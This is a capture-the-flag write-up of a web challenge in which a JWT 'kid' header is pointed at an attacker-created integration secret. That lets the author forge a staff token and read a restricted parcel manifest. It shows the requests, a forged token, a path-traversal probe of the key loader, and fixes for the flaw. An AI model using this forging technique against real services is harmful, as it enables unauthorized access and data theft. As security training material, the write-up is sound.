# web404 — ByteExpress "Lost Parcel" Writeup

**Flag:** `CYBLTZ2026{k3y_C0Nfus1onn}`
**Category:** Web (auth bypass / JWT `kid` key-confusion)
**Targets:** `http://45.77.247.35:22005`, `http://5.223.64.53:22005`
**Solve:** `./solve.py` (stdlib only, one shot, ~2s)

---

## 1. Recon

Flask app behind gunicorn. Server-rendered pages, no framework JS worth reading
except the two API-discovery scripts the author helpfully shipped.

| Route | Notes |
|---|---|
| `/` `/track` `/faq` `/login` `/register` | public |
| `/track?id=CYB-404` | **silently blanks** — the target parcel is suppressed |
| `/account` | customer area, links `/settings/integrations` and `/staff` |
| `/staff` | Dispatch Console page (reachable by any logged-in user; data is API-gated) |
| `/api/integrations` | `GET` list, `POST` create |
| `/api/dispatch/queues` `/api/dispatch/parcels?status=` `/api/dispatch/manifests/<id>` | 403 `You don't work here.` |

`/static/staff.js` was the key map — it documents the whole staff API surface and
advertises the failure text: *"Dispatch data requires a staff token."*

Auth is a **JWT HS256 in the `token` cookie**. A real login token:

```
header  {"alg":"HS256","kid":"authentication/v1/customer.key","typ":"JWT"}
payload {"sub":"tester1","aud":"byteexpress","iat":...,"exp":...}
```

No `role` claim. Note the `kid` is a **file path**, not a key id.

## 2. The vulnerability — unrestricted `kid` key resolution

`/settings/integrations` lets any customer create a carrier integration with a
**secret of the attacker's choosing**, and the server hands back the path it will
store that secret at:

```
POST /api/integrations  {"name":"forge1","webhook_url":"https://example.com/h","secret":"topsecret1"}
-> {"id":37,"key_id":"integrations/37/forge1.key",
    "signing_reference":"integrations/37/forge1.key","status":"active",...}
```

The page even hands you the primitive in prose:

> *Carrier webhooks are authenticated with an HS256 signing secret. Use the
> Signing Reference when a system asks which signing secret to load.*

Session verification resolves the HMAC secret **straight from `kid`, with no
namespace allow-list**. So `kid = integrations/37/forge1.key` makes the token
verify against a secret the attacker already knows → **total control of the
token payload.**

I proved the trust boundary by response code alone:

| `kid` | secret | `/account` | meaning |
|---|---|---|---|
| `integrations/37/forge1.key` | wrong | **401** | key found, signature fails |
| `integrations/37/forge1.key` | correct | **403** | **signature valid**, authz rejects |
| `integrations/1/admin.key` | any | 401 | key not found |
| `authentication/v1/customer.key` | wrong | 401 | key found, signature fails |

The 401→403 flip on a secret *we chose* is the whole bug: signature verification
now trusts an attacker-controlled key.

Two extra confirmations while I was in there:
- No claim-based bypass — `role`, `is_staff`, `scope`, `principal`, `level`, … all 403.
- `kid` path traversal resolves: `integrations/37/../37/forge1.key` → 403 (found),
  while a leading `/` → 401. The key path is not sanitised. It didn't change the
  outcome here because authorization is bound to `kid`-independent state, but it
  means the loader is an arbitrary-path secret read.

## 3. Authorization is `sub`-only — `dispatcher` is a staff principal

Since the signature was now forgeable, I swept the payload. No claim mattered —
only `sub`:

```
sub=tester1       -> /api/dispatch/queues  403
sub=admin         -> /api/dispatch/queues  403
sub=staff         -> /api/dispatch/queues  403
sub=dispatcher    -> /api/dispatch/queues  200   <--
```

Note the trap I walked straight into: the 403 tests hit `/account` first, which
returns **403 even for a perfectly valid staff token** (`dispatcher` has no
customer account). Judging by `/account` alone I would have concluded the whole
key-confusion path was dead. The staff API is the only thing worth measuring.

Final token — `kid` points at my own integration, signed with my own secret, only
`sub` changed:

```
eyJhbGciOiJIUzI1NiIsImtpZCI6ImludGVncmF0aW9ucy8zNy9mb3JnZTEua2V5IiwidHlwIjoiSldUIn0
  .eyJzdWIiOiJkaXNwYXRjaGVyIiwiYXVkIjoiYnl0ZWV4cHJlc3MiLCJpYXQiOjE3OTIxMTUwMzgsImV4cCI6MTc5MjExODYzOH0
  .KFMdBfMe2dIyzxGDB2c29Qj2W7V-e8UrBZvLbvT7GX4
```

## 4. Reading the restricted manifest

```
GET /api/dispatch/queues
-> [{"count":4,"queue":"delivered"},{"count":1,"queue":"in_transit"},
    {"count":2,"queue":"investigation"},{"count":1,"queue":"lost"}, ...]

GET /api/dispatch/parcels?status=lost
-> [{"classification":"SEALED","recipient":"CLASSIFIED","sender":"CYBERBLITZ",
     "status":"lost","tracking":"CYB-404"}]

GET /api/dispatch/manifests/CYB-404
-> {"classification":"SEALED","contents":"CYBLTZ2026{k3y_C0Nfus1onn}",
     "handled_by":null,"recipient":"CLASSIFIED","sender":"CYBERBLITZ",
     "status":"lost","tracking":"CYB-404"}
```

## 5. Chain summary

```
register (open registration)
  -> login, get customer JWT
  -> POST /api/integrations  (secret = attacker-chosen)
  -> get signing_reference "integrations/<id>/<name>.key"
  -> forge HS256 token: kid=that path, secret=ours, sub=dispatcher
  -> /api/dispatch/manifests/CYB-404
  -> CYBLTZ2026{k3y_C0Nfus1onn}
```

## 6. Root cause & fix

One bug, three missing controls in the JWT verifier:

1. **No key-namespace allow-list on `kid`.** A single resolver serves both login
   tokens (`authentication/v1/*.key`) and per-tenant carrier webhook secrets
   (`integrations/*/*.key`), so any tenant's signing key also authenticates
   sessions. Scope key material by purpose and reject `kid` outside the expected
   set.
2. **`kid` is an unsanitised path.** `..` segments resolved normally — an
   arbitrary-path secret read. Canonicalise and confine to the key root, and
   reject `..`/absolute paths outright.
3. **Authorization reads only the `sub` string**, with no role, `iss`, or
   audience binding beyond a literal `aud` string compare. A shared
   customer-signing key plus an unenforced `sub` means any authenticated party
   can become any principal. Put the role *inside* the token as a signed claim
   (or bind `kid` → principal at key-issue time), and verify `iss`/`aud`
   properly.

Also worth fixing: open self-registration reaching an area that mints crypto key
material, and `/staff` serving its page to non-staff users (the 403 belongs at
the page, not just the API).